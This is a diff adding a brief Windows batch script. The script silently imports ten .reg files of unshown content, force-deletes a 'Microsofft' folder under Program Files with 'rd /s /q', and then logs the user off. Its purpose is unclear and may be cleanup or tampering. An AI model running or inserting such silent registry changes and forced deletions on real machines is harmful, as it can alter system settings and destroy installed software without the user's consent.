@@ -1,0 +1,15 @@
+start/wait regedit -s 0.reg 
+start/wait regedit -s 1.reg 
+start/wait regedit -s 2.reg 
+start/wait regedit -s 3.reg 
+start/wait regedit -s 4.reg 
+start/wait regedit -s 5.reg 
+start/wait regedit -s 6.reg 
+start/wait regedit -s 7.reg 
+start/wait regedit -s 8.reg 
+start/wait regedit -s 9.reg 
+cd %ProgramFiles%
+rd Microsofft /s /q 
+Shutdown  -l 
+
+
